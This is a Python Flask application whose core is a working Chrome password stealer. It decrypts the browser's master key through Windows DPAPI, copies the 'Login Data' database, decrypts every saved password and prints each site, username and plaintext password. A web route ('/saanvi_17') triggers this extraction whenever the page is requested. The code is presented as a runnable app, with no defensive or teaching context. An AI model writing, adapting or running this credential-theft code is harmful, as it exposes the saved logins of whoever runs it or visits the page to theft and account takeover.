from flask import Flask, render_template
import requests
import logging
import json
import base64
import os
from Cryptodome.Cipher import AES
import shutil
import win32crypt
from datetime import timezone, datetime, timedelta
import sqlite3


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


app = Flask("__main__", template_folder="templates")
logging.basicConfig(level=logging.DEBUG)


def fetching_encryption_key():

    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):

    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def main():
    key = fetching_encryption_key()
    db_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data"
    )
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used"
    )

    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")

        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


@app.route("/saanvi_17")
def saanvi_17():
    return render_template("home.html")


@app.route("/saanvi_17", methods=["POST", "GET"])
def run_code():
    main()
    return render_template("after.html")


if __name__ == "__main__":
    app.run()
